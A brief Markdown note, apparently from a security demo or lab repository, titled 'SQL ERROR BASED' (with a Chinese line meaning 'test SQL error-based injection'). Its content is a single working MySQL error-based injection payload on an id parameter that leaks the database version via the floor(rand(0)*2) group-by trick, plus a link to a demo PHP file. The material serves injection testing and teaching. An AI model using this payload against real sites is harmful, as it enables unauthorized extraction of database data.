##SQL ERROR BASED
测试SQL语句报错注入
```
id=1 and (select 1 from(select count(*),concat(concat(concat(0x7b,version()),0x7d),floor(rand(0)*2))x from INFORMATION_SCHEMA.TABLES group by x)a)
```
测试[demo代码](SqlInjectDemo.php)
